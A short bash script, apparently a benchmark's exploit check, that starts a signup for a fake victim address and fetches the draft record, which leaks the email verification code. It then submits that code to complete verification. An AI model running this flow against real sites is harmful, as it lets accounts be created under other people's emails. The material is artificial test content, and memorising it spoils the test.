#!/usr/bin/env bash
set -eu; . "$(dirname "$0")/_lib.sh"
V="victim-$$@bench.local"
ID=$(curl -s -X POST "$TARGET/api/signup/start.php" -H 'content-type: application/json' -d "{\"email\":\"$V\"}" | json_get draftId)
[ -n "$ID" ]
S=$(curl -s "$TARGET/api/signup/draft.php?id=$ID")
echo "$S" | grep -q "$V"; echo "$S" | grep -q '"code"'
C=$(echo "$S" | json_get code)
curl -s -X POST "$TARGET/api/signup/verify.php" -H 'content-type: application/json' -d "{\"draftId\":$ID,\"code\":\"$C\"}" | grep -q '"ok":true'
